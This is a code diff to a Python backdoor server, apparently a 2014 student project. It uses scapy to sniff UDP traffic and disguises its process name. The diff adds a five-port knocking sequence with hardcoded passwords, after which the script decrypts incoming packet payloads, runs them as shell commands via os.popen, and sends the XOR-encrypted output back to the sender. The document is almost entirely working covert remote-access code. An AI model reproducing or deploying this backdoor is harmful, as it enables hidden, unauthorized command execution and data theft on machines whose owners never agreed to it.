@@ -24,25 +24,42 @@
 
 import setproctitle
 import sys
+import logging
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
 import time
 import os
 from itertools import izip, cycle
 
+
 ################ USER DEFINED ########################################
 INTERFACE_ = 'em1'
 
 # Ports must be the same as the client.
-SPORT = 8000
-DPORT = 7999
+KNOCK1 = 1075
+PASS1 = '$f%g'
+
+KNOCK2 = 2078
+PASS2 = '!~fD'
+
+KNOCK3 = 3079
+PASS3 = '[";-'
+
+KNOCK4 = 4067
+PASS4 = '|JG,'
+
+KNOCK5 = 5075
+PASS5 = 'cfF^'
+
+CHANNEL = 80
 
 # Filter is tcpdump format
-FILTER = "udp and src port {0} and dst port {1}".format(SPORT, DPORT)
+FILTER = "udp and (dst port {0} or {1} or {2} or {3} or {4} or {5})".format(KNOCK1, KNOCK2, KNOCK3, KNOCK4, KNOCK5, CHANNEL)
 
 # Must make sure it is the same as the client
 ENCRYPTION_KEY = "zdehjk"
 ######################################################################
-
+knockSequence = 0
 
 ######################################################################
 ##	FUNCTION:	    xor_crypt
@@ -93,16 +110,21 @@ def xor_crypt(data, ENCRYPTION_KEY=ENCRYPTION_KEY):
 ##
 ######################################################################
 def remoteExecute(packet):
-    print "Running Command: " + xor_crypt(packet.load, decode=True)
-    command = os.popen(xor_crypt(packet.load, decode=True))
-    command_result = command.read()
-    print command_result
+    global knockSequence
+    if knockSequence != 5:
+        check_knock(packet[0][2].dport, xor_crypt(packet.load))
+        print "KnockSequence: {0}".format(knockSequence)
+    else:
+        print "Running Command: " + xor_crypt(packet.load)
+        command = os.popen(xor_crypt(packet.load))
+        command_result = command.read()
+        print command_result
 
-    dest_ip = packet[0][1].src
-    print "Sending encrypted response.."
-    send(IP(dst=dest_ip) / UDP(sport=DPORT, dport=SPORT) / xor_crypt(command_result, encode=True))
-
-    return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
+        dest_ip = packet[0][1].src
+        print "Sending encrypted response.."
+        send(IP(dst=dest_ip) / UDP(sport=4444, dport=CHANNEL) / xor_crypt(command_result))
+        knockSequence = 0
+        return "Packet Arrived" + ": " + packet[0][1].src + "==>" + packet[0][1].dst
 
 
 ######################################################################
@@ -132,6 +154,98 @@ def set_proc_name(newname):
     buff.value = newname
     libc.prctl(15, byref(buff), 0, 0, 0)
 
+######################################################################
+##	FUNCTION:	    check_knock
+##
+##	INTERFACE:	   check_knock(port, password)
+##
+##				    port:       The port that the packet came in on.
+##                  password:   The password to verify the knock sequence.
+##
+##	RETURNS:        The value of the knockSequence. If 5 it is complete.
+##
+##	LAST MODIFIED:  November 15, 2014
+##
+##	DESIGNERS:	    Zach Smoroden & Slade Solobay
+##
+##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
+##
+##	NOTES:
+##	        This will make sure that the knock sequence is correct.
+##
+######################################################################
+def check_knock(port, password):
+    global knockSequence
+    if knockSequence == 0:
+        if port == KNOCK1:
+            if password == PASS1:
+                knockSequence += 1
+                return knockSequence
+            else:
+                return bad_knock()
+        else:
+            return bad_knock()
+    elif knockSequence == 1:
+        if port == KNOCK2:
+            if password == PASS2:
+                knockSequence += 1
+                return knockSequence
+            else:
+                return bad_knock()
+        else:
+            return bad_knock()
+    elif knockSequence == 2:
+        if port == KNOCK3:
+            if password == PASS3:
+                knockSequence += 1
+                return knockSequence
+            else:
+                return bad_knock()
+        else:
+            return bad_knock()
+    elif knockSequence == 3:
+        if port == KNOCK4:
+            if password == PASS4:
+                knockSequence += 1
+                return knockSequence
+            else:
+                return bad_knock()
+        else:
+            return bad_knock()
+    elif knockSequence == 4:
+        if port == KNOCK5:
+            if password == PASS5:
+                knockSequence += 1
+                return knockSequence
+            else:
+                return bad_knock()
+        else:
+            return bad_knock()
+    elif knockSequence == 5:
+        return knockSequence
+
+######################################################################
+##	FUNCTION:	    bad_knock
+##
+##	INTERFACE:	   bad_knock(newname)
+##
+##
+##	RETURNS:        0 for failed knock
+##
+##	LAST MODIFIED:  November, 2014
+##
+##	DESIGNERS:	    Zach Smoroden & Slade Solobay
+##
+##	PROGRAMMERS:	Zach Smoroden & Slade Solobay
+##
+##	NOTES:
+##	        This will just reset the knockSequence and return 0.
+##
+######################################################################
+def bad_knock():
+    global knockSequence
+    knockSequence = 0
+    return 0
 ######################################################################
 ##	FUNCTION:	    set_proc_name
 ##
